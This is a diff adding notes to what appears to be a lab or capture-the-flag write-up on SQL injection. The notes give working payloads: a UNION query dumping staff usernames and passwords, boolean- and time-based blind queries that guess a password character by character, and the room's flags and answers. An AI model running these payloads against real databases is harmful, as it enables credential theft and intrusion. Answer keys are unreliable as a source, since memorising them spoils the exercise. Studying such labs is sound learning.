@@ -81,5 +81,88 @@ We can delete entries from the table with DELETE.
 
 ## Task 4 What is SQL Injection?
 
+- What character signifies the end of an SQL query?
+> ;
+
+## Task 5 In-Band SQLi
+
+We start by injecting the code "`0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`" into the database. This will result into us getting the info we want.
 
 
+![](Attachments/sqlinjection.png)
+
+We can use the password then to log us into the account getting the first flag.
+
+![](Attachments/first%20flag.png)
+
+> THM{SQL_INJECTION_3840}
+
+## Task 6 Blind SQLi - Authentication Bypass
+
+
+- What is the flag after completing level two? (and moving to level 3)
+
+We input SQL queries inside of the username and password fields of the login.
+
+![](Attachments/sqlinjection%20login.png)
+
+The result is us getting the flag.
+
+![](Attachments/second%20flag.png)
+
+> THM{SQL_INJECTION_9581}
+
+## Task 7 Blind SQLi - Boolean Based
+
+- gdfgdf
+
+We use:
+`admin123' UNION SELECT 1,2,3 from users where username like 'a%`
+annd keep on adding charackters until we find that the username is "admin".
+
+Then we use the:
+`admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%`
+Command to do the same just for the password
+
+![](Attachments/flag3.png)
+
+> THM{SQL_INJECTION_1093}
+
+## Task 8 Blind SQLi - Time Based
+
+- What is the final flag after completing level four?
+
+With the:
+`admin123' UNION SELECT SLEEP(5);--`
+command we can check how many columns the table has. The right answer will take 5 seconds to load because of the SLEEP(5).
+`admin123' UNION SELECT SLEEP(5),2;--`
+With the above command we will be able to see that the SLEEP(5) function gets executed correctly.
+
+![](Attachments/sleep%20function%20works.png)
+
+We can use the:
+``https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 from users where username like 'admin' and password like '4%';
+query to constantly check for the password until we guess it correctly with the help of the query.
+
+``referrer=admin123' UNION SELECT SLEEP(5),2 from users where username like 'admin' and password like '4961%';
+
+4961 is the correct password after enough trying.
+
+![](Attachments/final%20login.png)
+
+With the login credentials we are finally able to log into the account and gain access to the final flag.
+
+![](Attachments/final%20flag.png)
+
+> THM{SQL_INJECTION_MASTER}
+
+
+## Task 9 Out-of-Band SQLi
+
+- Name a protocol beginning with D that can be used to exfiltrate data from a database.
+> DNS
+
+## Task 10 Remediation
+
+- Name a method of protecting yourself from an SQL Injection exploit.
+> Prepared Statements
